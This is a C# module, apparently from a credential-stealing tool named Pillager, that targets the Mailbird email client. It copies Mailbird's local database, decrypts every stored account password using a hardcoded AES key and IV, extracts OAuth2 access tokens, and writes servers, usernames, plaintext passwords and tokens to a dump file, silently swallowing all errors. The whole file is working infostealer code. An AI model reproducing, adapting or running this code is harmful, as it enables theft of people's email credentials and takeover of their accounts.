using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Pillager.Helper;

namespace Pillager.Mails
{
    internal class MailBird : ICommand
    {
        public byte[] key = { 0X35, 0XE0, 0X85, 0X30, 0X8A, 0X6D, 0X91, 0XA3, 0X96, 0X5F, 0XF2, 0X37, 0X95, 0XD1, 0XCF, 0X36, 0X71, 0XDE, 0X7E, 0X5B, 0X62, 0X38, 0XD5, 0XFB, 0XDB, 0X64, 0XA6, 0X4B, 0XD3, 0X5A, 0X05, 0X53 };
        public byte[] iv = { 0X98, 0X0F, 0X68, 0XCE, 0X77, 0X43, 0X4C, 0X47, 0XF9, 0XE9, 0X0E, 0X82, 0XF4, 0X6B, 0X4C, 0XE8 };

        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                string dbpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Mailbird\\Store\\Store.db");
                if (!File.Exists(dbpath)) return sb.ToString();
                string tempdbPath = Path.GetTempFileName();
                File.Copy(dbpath, tempdbPath, true);
                SQLiteHandler handler = new SQLiteHandler(tempdbPath);
                if (handler.ReadTable("Accounts"))
                {
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        try
                        {
                            string server = handler.GetValue(i, "Server_Host");
                            string username = handler.GetValue(i, "Username");
                            string password = handler.GetValue(i, "EncryptedPassword");
                            password = AESDecrypt(Convert.FromBase64String(password), key, iv);
                            sb.AppendLine("Server_Host:" + server);
                            sb.AppendLine("Username:" + username);
                            sb.AppendLine("Password:" + password);
                            sb.AppendLine();
                        }
                        catch { }
                    }
                }
                handler = new SQLiteHandler(tempdbPath);
                if (handler.ReadTable("OAuth2Credentials")) 
                {
                    try
                    {
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string username = handler.GetValue(i, "AuthorizedAccountId");
                            string password = handler.GetValue(i, "AccessToken");
                            sb.AppendLine("AuthorizedAccountId:" + username);
                            sb.AppendLine("AccessToken:" + password);
                            sb.AppendLine();
                        }
                    }
                    catch { }
                }
                File.Delete(tempdbPath);
                return sb.ToString();
            }
            catch { return sb.ToString(); }
        }

        private string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
        {
            MemoryStream mStream = new MemoryStream(encryptedBytes);
            RijndaelManaged aes = new RijndaelManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = bKey;
            aes.IV = iv;
            CryptoStream cryptoStream = new CryptoStream(mStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
            try
            {
                byte[] tmp = new byte[encryptedBytes.Length + 32];
                int len = cryptoStream.Read(tmp, 0, encryptedBytes.Length + 32);
                byte[] ret = new byte[len];
                Array.Copy(tmp, 0, ret, 0, len);
                return Encoding.UTF8.GetString(ret);
            }
            finally
            {
                cryptoStream.Close();
                mStream.Close();
                aes.Clear();
            }
        }

        public override void Save(string path)
        {
            try
            {
                string result = GetInfo();
                if (string.IsNullOrEmpty(result)) return;
                string savepath = Path.Combine(path, "MailBird");
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "MailBird.txt"), result, Encoding.UTF8);
            }
            catch { }
        }
    }
}
